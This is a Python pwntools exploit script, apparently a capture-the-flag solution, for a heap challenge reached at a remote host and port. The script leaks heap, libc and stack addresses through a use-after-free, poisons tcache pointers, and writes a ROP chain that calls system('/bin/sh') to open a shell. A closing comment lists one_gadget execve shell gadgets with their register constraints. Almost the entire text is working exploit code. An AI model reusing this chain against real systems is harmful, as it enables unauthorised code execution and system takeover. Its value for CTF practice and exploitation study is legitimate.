#!/usr/bin/python3
# from Crypto.Util.number import *
from pwn import *
import struct
exe = ELF('chal', checksec=False)
libc = ELF('./lib/libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('chal.amt.rs', 1346)
else:
    p = process(exe.path)

GDB()


def c(idx, len1, key1, len2, val):
    sla(b'>>>', '1')
    sla(b'>>>', str(idx))
    sla(b'>>>', str(len1))
    sla(b'>>>', (key1))
    sla(b'>>>', str(len2))
    sla(b'>>>', (val))


def re(idx):
    sla(b'>>>', '3')
    sla(b'>>>', str(idx))


def up(idx, val):
    sla(b'>>>', '2')
    sla(b'>>>', str(idx))
    sla(b'>>>', (val))


def de(idx):
    sla(b'>>>', '4')
    sla(b'>>>', str(idx))


c(0, 0x80, b'key', 0x70, b'val')
c(1, 0x70, b'key', 0x70, b'val')
de(0)
de(1)
re(0)
p.recvuntil(b'key = ')
print(p.recvuntil(b'\\x05\\x00\\x00\\x00').decode())
heap = int(input()) << 12
info("heap " + hex(heap))

c(2, 0x500, b'key', 0x500, b'val')
de(2)
re(2)

p.recvuntil(b'key = ')
print(p.recvuntil(b'\\x00\\x00').decode())
libc.address = int(input()) - 0x21ace0
info("heap " + hex(libc.address))

payload = (heap+0x430) >> 12 ^ (libc.sym.environ-0x10)
up(1, flat(payload))
pa = b'a'*15
c(3, 0x70, b'key', 0x70, pa)

re(3)
p.recvuntil(b'aaaaaaaaaaaaaaa\\x00')
print(p.recvuntil(b'\\x00\\x00').decode())
stack = int(input()) - 0x88 - 0xa0
info("heap " + hex(stack))

c(0, 0x80, b'key', 0x100, b'val')
c(1, 0x100, b'key', 0x100, b'val')
de(0)
de(1)

payload = (heap+0x6d0) >> 12 ^ (stack)
up(1, flat(payload))
pa = flat(0, libc.address + 0x000000000002a3e5 + 1, libc.address +
          0x000000000002a3e5, next(libc.search(b'/bin/sh')), libc.sym.system)
c(3, 0x100, b'key', 0x100, pa)

p.interactive()
'''
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
'''
